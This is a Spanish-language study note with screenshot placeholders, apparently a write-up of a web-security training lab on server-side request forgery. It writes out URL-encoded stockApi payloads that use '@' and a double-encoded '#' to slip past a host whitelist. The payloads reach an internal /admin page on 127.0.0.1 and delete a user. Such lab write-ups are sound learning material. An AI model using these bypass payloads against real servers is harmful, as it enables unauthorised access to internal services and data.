![[Pasted image 20230925133032.png]]



![[Pasted image 20230925140613.png]]


![[Pasted image 20230925140658.png]]

![[Pasted image 20230925140645.png]]

![[Pasted image 20230925140727.png]]

![[Pasted image 20230925140810.png]]

el payload decodificado es:

http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1


![[Pasted image 20230925140934.png]]

Interactiando con la API:

![[Pasted image 20230925141018.png]]

![[Pasted image 20230925141028.png]]

a fuerza debe incluir ese url, probando con el payload: stockApi=http%3a//username@stock.weliketoshop.net

![[Pasted image 20230925141214.png]]

...

![[Pasted image 20230925141231.png]]

pudimos interactuar y obtener una salida de datos,  ahora el caracter # ayuda a bypassear el filtro, de manera que sustituyamos el weliketoshop por localhost, # encodeado es %2523:

stockApi=http%3a//username%2523@stock.weliketoshop.net

nuevamente obtuvimos un error 500 lo cual es interaccion:

![[Pasted image 20230925141629.png]]

...

![[Pasted image 20230925141645.png]]



el siguiente payload a probar puede ser este:
stockApi=http%3a//username%2523@stock.weliketoshop.net/admin/delete?username=carlos

Este payload de arriba no funcionó, al siguiente día encontré esta pagina: https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery y ahi me fije como bypassear una whitelist, probe este payload:

stockApi=http%3a//127.0.0.1%2523%40stock.weliketoshop.net%3a8080/admin

y me generó esto:

![[Pasted image 20230927135842.png]]

....

![[Pasted image 20230927135859.png]]

completando la asignación:

stockApi=http%3a//127.0.0.1%2523%40stock.weliketoshop.net%3a8080/admin/delete?username=carlos

![[Pasted image 20230927135941.png]]

![[Pasted image 20230927135957.png]]

este es el primer laboratorio que resuelvo por mi cuenta
